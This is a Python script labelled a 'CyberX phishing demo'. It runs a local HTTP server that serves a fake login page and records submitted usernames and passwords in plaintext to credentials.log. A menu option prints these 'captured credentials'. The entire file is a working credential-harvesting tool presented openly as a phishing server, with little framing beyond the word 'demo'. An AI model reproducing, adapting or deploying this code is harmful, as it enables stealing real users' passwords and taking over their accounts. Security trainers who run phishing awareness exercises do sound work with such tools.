#!/usr/bin/env python3

import os
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import threading

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('templates/index.html', 'r') as f:
                self.wfile.write(f.read().encode())
        elif self.path == '/static/style.css':
            self.send_response(200)
            self.send_header('Content-type', 'text/css')
            self.end_headers()
            with open('static/style.css', 'r') as f:
                self.wfile.write(f.read().encode())
        elif self.path == '/static/script.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            with open('static/script.js', 'r') as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            credentials = parse_qs(post_data)
            
            username = credentials.get('username', [''])[0]
            password = credentials.get('password', [''])[0]
            
            # Save credentials to log file
            with open('credentials.log', 'a') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] Username: {username}, Password: {password}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('templates/success.html', 'r') as f:
                self.wfile.write(f.read().encode())

def start_server():
    port = 8080
    server = HTTPServer(('localhost', port), PhishingHandler)
    print(f"\n[+] Phishing server started on http://localhost:{port}")
    print("[+] Press Ctrl+C to stop the server\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Stopping server...")
        server.shutdown()

def view_credentials():
    if not os.path.exists('credentials.log'):
        print("\n[!] No credentials captured yet.")
        return
    
    print("\n=== CAPTURED CREDENTIALS ===")
    with open('credentials.log', 'r') as f:
        content = f.read()
        if content.strip():
            print(content)
        else:
            print("[!] No credentials captured yet.")

def main():
    # Ensure required directories exist
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    while True:
        print("\n===== CYBERX PHISHING DEMO =====")
        print("1. Start phishing server")
        print("2. View credential log")
        print("3. Exit")
        
        choice = input("\nEnter your choice (1-3): ").strip()
        
        if choice == '1':
            # Start server in a separate thread so we can still use the menu
            server_thread = threading.Thread(target=start_server)
            server_thread.daemon = True
            server_thread.start()
            
            # Keep main thread alive
            try:
                while True:
                    pass
            except KeyboardInterrupt:
                print("\n[-] Server stopped.")
                
        elif choice == '2':
            view_credentials()
        elif choice == '3':
            print("\n[+] Exiting CyberX. Goodbye!")
            sys.exit(0)
        else:
            print("\n[!] Invalid choice. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    main()
